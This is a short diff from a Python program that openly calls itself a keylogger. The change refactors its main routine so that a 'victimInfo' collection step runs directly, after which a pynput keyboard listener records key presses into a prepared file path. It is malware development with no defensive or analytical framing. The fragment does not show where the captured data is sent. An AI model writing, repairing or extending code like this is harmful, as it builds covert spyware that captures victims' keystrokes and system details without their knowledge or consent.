@@ -20,18 +20,12 @@ def main():
     global FILEPATH;
     filepath: str = ""
     filepath = makePath()  # Create the path for the files to be stored
-    FILEPATH = filepath;
-
-    # Create process to get info
-    infoProcess = multiprocessing.Process(target=victimInfo(filepath))
-    infoProcess.start()
+    FILEPATH = filepath
+    victimInfo(filepath)
 
     # Keylogger process runs
     with Listener(on_press=keyPress) as listener:
         listener.join()
-
-    # Info process runs at the same time as well to not interrupt the keylogger
-    infoProcess.join()
 
 def keyPress(key: Key) -> None:
     """
